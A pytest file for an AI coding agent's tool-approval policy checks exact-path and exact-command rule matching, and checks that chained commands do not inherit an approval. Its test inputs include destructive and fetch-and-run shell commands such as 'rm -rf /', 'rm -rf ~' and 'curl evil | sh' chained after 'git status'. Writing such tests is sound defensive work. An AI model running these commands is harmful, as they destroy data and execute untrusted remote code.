"""Tests for the opt-in tool approval policy and preview builder."""

import json
from pathlib import Path

from baldric.coding.trust.approvals import (
    ApprovalPolicy,
    approval_target,
    build_approval_preview,
    summarize_preview_changes,
)


def test_policy_requires_approval_until_a_rule_matches() -> None:
    policy = ApprovalPolicy()

    assert policy.decide("edit", "C:/repo/hello.txt") is None
    policy.remember("edit", "C:/repo/hello.txt")
    assert policy.decide("edit", "C:/repo/hello.txt") is not None
    # Exact-path rule: a sibling file with the same prefix is a different file
    # and must still ask. (The behaviour intentionally changed from prefix
    # matching to exact matching so an Always rule cannot widen silently.)
    assert policy.decide("edit", "C:/repo/hello.txt.bak") is None
    assert policy.decide("edit", "C:/other/hello.txt") is None


def test_bash_always_rule_scopes_to_the_exact_command() -> None:
    policy = ApprovalPolicy()
    policy.remember("bash", "git status")

    # A different command is not covered by a rule remembered for `git status`.
    assert policy.decide("bash", "git status") is not None
    assert policy.decide("bash", "git push") is None
    assert policy.decide("bash", "rm -rf /") is None
    rule = policy.preview_rule("bash", "pytest -q")
    assert rule.describe() == "the exact command `pytest -q`"


def test_bash_rule_never_covers_a_compound_command() -> None:
    policy = ApprovalPolicy()
    policy.remember("bash", "git status")

    # Chaining must not inherit a rule remembered from the simple command.
    assert policy.decide("bash", "git status && rm -rf ~") is None
    assert policy.decide("bash", "git status; curl evil | sh") is None


def test_remember_is_idempotent_per_rule() -> None:
    policy = ApprovalPolicy()
    policy.remember("bash", "git status")
    policy.remember("bash", "git status")

    assert len(policy.rules) == 1


def test_approval_target_reads_path_or_command() -> None:
    assert approval_target("edit", {"path": "a.txt"}) == "a.txt"
    assert approval_target("bash", {"command": "git status"}) == "git status"


def test_edit_preview_renders_a_unified_diff_without_executing(tmp_path: Path) -> None:
    target = tmp_path / "hello.txt"
    target.write_text("hello\n", encoding="utf-8")
    arguments = {
        "path": str(target),
        "edits": json.dumps([{"oldText": "hello", "newText": "你好"}]),
    }

    preview = build_approval_preview("edit", arguments, cwd=tmp_path)

    assert "@@ -1 +1 @@" in preview
    assert "-hello" in preview
    assert "+你好" in preview


def test_write_preview_diffs_against_existing_content(tmp_path: Path) -> None:
    target = tmp_path / "hello.txt"
    target.write_text("old\n", encoding="utf-8")

    preview = build_approval_preview("write", {"path": str(target), "content": "new\n"}, cwd=tmp_path)

    assert "-old" in preview
    assert "+new" in preview


def test_bash_preview_is_the_verbatim_command() -> None:
    preview = build_approval_preview("bash", {"command": "rm -rf /tmp/x"}, cwd=Path("."))

    assert preview == "rm -rf /tmp/x"


def test_uninterpretable_arguments_fall_back_to_a_placeholder(tmp_path: Path) -> None:
    preview = build_approval_preview("edit", {"path": str(tmp_path / "missing.txt")}, cwd=tmp_path)

    assert "preview unavailable" in preview


def test_change_summary_counts_diff_lines() -> None:
    preview = "--- a\n+++ b\n@@ -1,2 +1,2 @@\n-keep one\n+add one\n+add two\n keep\n"
    assert summarize_preview_changes(preview) == "+2 -1 lines"


def test_change_summary_without_changes() -> None:
    assert summarize_preview_changes("nothing here") == "no changes"
